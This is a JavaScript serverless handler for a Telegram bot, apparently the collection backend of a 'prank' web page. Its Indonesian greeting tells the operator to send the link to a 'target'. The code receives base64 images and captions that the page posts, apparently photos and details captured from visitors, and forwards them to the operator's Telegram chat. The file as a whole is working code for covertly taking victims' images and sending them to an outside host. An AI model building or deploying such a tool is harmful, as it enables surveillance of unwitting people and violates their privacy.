export default async function handler(req, res) {
    const TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // Fitur membalas /start di Telegram
    if (req.method === 'POST' && req.body.message) {
        const msg = req.body.message;
        if (msg.text === '/start') {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: msg.chat.id,
                    text: "Bot Aktif! Kirimkan link web prank ke target untuk mulai beraksi. 🔥"
                })
            });
        }
        return res.status(200).send('ok');
    }

    // Fitur mengirim data hasil Prank dari Web
    if (req.method === 'POST' && req.body.image) {
        try {
            const { image, caption } = req.body;
            const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
            const buffer = Buffer.from(base64Data, 'base64');
            const formData = new FormData();
            
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', new Blob([buffer]), 'scan.png');
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');

            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            return res.status(200).json({ status: 'success' });
        } catch (error) {
            return res.status(500).json({ error: error.message });
        }
    }

    return res.status(405).send('Method Not Allowed');
}
